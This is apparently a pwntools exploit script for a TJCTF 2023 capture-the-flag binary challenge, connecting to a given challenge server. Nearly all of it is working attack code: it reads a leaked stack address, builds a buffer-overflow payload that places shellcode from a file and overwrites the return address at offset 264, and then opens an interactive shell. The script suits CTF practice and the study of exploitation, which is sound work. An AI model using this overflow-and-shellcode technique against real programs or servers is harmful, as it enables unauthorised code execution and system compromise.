#!/usr/bin/env python3

#===========================================================
#                       TJCTF 2023
#===========================================================

from pwn import *

exe = context.binary = ELF('./chall.elf')

host = args.HOST or '34.145.237.189'
port = int(args.PORT or 31365)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

# shellcode without syscall <=> b'\x0f\x05'
shellcode = open("binsh_noSyscall", "rb").read()

# srv prints stack address
addr = io.recvline()
stack_addr = int(addr[:-1].decode(), 16) 

# payload include shellcode and his address in return-address place (bof)
payload = flat(
    {
        0:          shellcode,
        256+8:      stack_addr
    },
    filler = b'\x00', length = 512
) 

io.send(payload)

io.interactive()